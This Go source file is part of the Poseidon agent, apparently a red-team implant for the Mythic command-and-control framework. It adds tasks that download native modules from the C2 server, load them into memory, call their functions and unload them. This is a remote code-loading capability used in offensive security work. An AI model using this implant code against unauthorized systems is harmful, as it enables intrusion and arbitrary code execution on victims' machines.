//go:build (linux || darwin) && (native_import || native_call || native_unload || native_module || debug)

package native_module

import (
	"encoding/json"
	"fmt"
	"sync"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/taskRegistrar"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type nativeModule struct {
	handle uintptr
	path   string
	callMu sync.Mutex
}

type importArguments struct {
	FileID string `json:"file_id"`
}

type callArguments struct {
	FileID       string   `json:"file_id"`
	FunctionName string   `json:"function_name"`
	Args         []string `json:"args"`
}

type unloadArguments struct {
	FileID string `json:"file_id"`
}

var (
	loadedModules      = make(map[string]*nativeModule)
	loadedModulesMutex sync.RWMutex
)

func init() {
	taskRegistrar.Register("native_import", RunImport)
	taskRegistrar.Register("native_call", RunCall)
	taskRegistrar.Register("native_unload", RunUnload)
}

func RunImport(task structs.Task) {
	msg := task.NewResponse()

	args := importArguments{}
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	if args.FileID == "" {
		msg.SetError("Missing file_id")
		task.Job.SendResponses <- msg
		return
	}

	loadedModulesMutex.RLock()
	_, exists := loadedModules[args.FileID]
	loadedModulesMutex.RUnlock()
	if exists {
		msg.SetError(fmt.Sprintf("Native module %s is already loaded", args.FileID))
		task.Job.SendResponses <- msg
		return
	}

	fileBytes, err := downloadFile(task, args.FileID)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	module, err := loadNativeModule(args.FileID, fileBytes)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	loadedModulesMutex.Lock()
	if _, exists = loadedModules[args.FileID]; exists {
		loadedModulesMutex.Unlock()
		_ = closeNativeModule(module)
		cleanupNativeModule(module)
		msg.SetError(fmt.Sprintf("Native module %s is already loaded", args.FileID))
		task.Job.SendResponses <- msg
		return
	}
	loadedModules[args.FileID] = module
	loadedModulesMutex.Unlock()

	msg.Completed = true
	msg.UserOutput = fmt.Sprintf("Imported native module %s", args.FileID)
	task.Job.SendResponses <- msg
}

func RunCall(task structs.Task) {
	msg := task.NewResponse()

	args := callArguments{}
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	if args.FileID == "" {
		msg.SetError("Missing file_id")
		task.Job.SendResponses <- msg
		return
	}
	if args.FunctionName == "" {
		msg.SetError("Missing function_name")
		task.Job.SendResponses <- msg
		return
	}

	loadedModulesMutex.RLock()
	module, exists := loadedModules[args.FileID]
	if !exists {
		loadedModulesMutex.RUnlock()
		msg.SetError(fmt.Sprintf("Native module %s is not loaded", args.FileID))
		task.Job.SendResponses <- msg
		return
	}
	module.callMu.Lock()
	loadedModulesMutex.RUnlock()
	defer module.callMu.Unlock()

	output, err := callNativeModule(module, args.FunctionName, args.Args)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	msg.Completed = true
	msg.UserOutput = output
	task.Job.SendResponses <- msg
}

func RunUnload(task structs.Task) {
	msg := task.NewResponse()

	args := unloadArguments{}
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	if args.FileID == "" {
		msg.SetError("Missing file_id")
		task.Job.SendResponses <- msg
		return
	}

	loadedModulesMutex.Lock()
	module, exists := loadedModules[args.FileID]
	if !exists {
		loadedModulesMutex.Unlock()
		msg.SetError(fmt.Sprintf("Native module %s is not loaded", args.FileID))
		task.Job.SendResponses <- msg
		return
	}
	delete(loadedModules, args.FileID)
	module.callMu.Lock()
	loadedModulesMutex.Unlock()
	defer module.callMu.Unlock()

	if err := closeNativeModule(module); err != nil {
		cleanupNativeModule(module)
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	cleanupNativeModule(module)

	msg.Completed = true
	msg.UserOutput = fmt.Sprintf("Unloaded native module %s", args.FileID)
	task.Job.SendResponses <- msg
}

func downloadFile(task structs.Task, fileID string) ([]byte, error) {
	r := structs.GetFileFromMythicStruct{}
	r.FileID = fileID
	r.FullPath = ""
	r.Task = &task
	r.ReceivedChunkChannel = make(chan []byte)
	task.Job.GetFileFromMythic <- r

	fileBytes := make([]byte, 0)
	for {
		newBytes := <-r.ReceivedChunkChannel
		if len(newBytes) == 0 {
			break
		}
		fileBytes = append(fileBytes, newBytes...)
	}
	if len(fileBytes) == 0 {
		return nil, fmt.Errorf("Failed to get file")
	}
	return fileBytes, nil
}
